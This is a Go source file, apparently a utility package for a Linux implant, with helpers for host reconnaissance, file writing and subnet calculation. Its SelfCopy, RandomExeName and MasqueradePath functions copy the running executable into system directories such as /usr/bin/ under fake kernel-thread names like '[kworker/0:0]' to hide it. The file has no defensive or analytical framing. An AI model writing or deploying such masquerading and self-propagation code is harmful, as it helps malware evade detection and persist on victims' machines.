package common

import (

	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func GetHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

func GetPID() int { return os.Getpid() }

func GetCWD() string {
	d, err := os.Getwd()
	if err != nil {
		return "/tmp"
	}
	return d
}

func GetOS() string   { return runtime.GOOS }
func GetArch() string { return runtime.GOARCH }

func FileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func WriteFile(path string, data []byte, perm os.FileMode) error {
	return os.WriteFile(path, data, perm)
}

func ReadFile(path string) ([]byte, error) {
	return os.ReadFile(path)
}

func AppendFile(path string, data []byte) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.Write(data)
	return err
}

func DeleteFile(path string) error { return os.Remove(path) }

func SelfPath() string {
	exe, err := os.Executable()
	if err != nil {
		return "/tmp/.tmp"
	}
	return exe
}

func SelfCopy(dst string) error {
	data, err := ReadFile(SelfPath())
	if err != nil {
		return err
	}
	return WriteFile(dst, data, 0755)
}

func RandomExeName() string {
	names := []string{
		"[kworker/u256+0]",
		"[kworker/0:0]",
		"[jbd2/dm-0-8]",
		"[kthrotld/0]",
		"[kdevtmpfs]",
		"[btrfs-worker]",
	}
	return names[time.Now().UnixNano()%int64(len(names))]
}

func MasqueradePath() string {
	dirs := []string{
		"/usr/lib/systemd/",
		"/usr/lib/apt/",
		"/usr/bin/",
	}
	base := dirs[time.Now().UnixNano()%int64(len(dirs))]
	os.MkdirAll(base, 0755)
	return filepath.Join(base, RandomExeName())
}

func Timestamp() string {
	return fmt.Sprintf("%d", time.Now().Unix())
}

func GetLocalIPs() []string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}
	var ips []string
	for _, ifi := range ifaces {
		addrs, err := ifi.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	return ips
}

func CIDRFromIP(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return ""
	}
	return fmt.Sprintf("%s.%s.%s.0/24", parts[0], parts[1], parts[2])
}
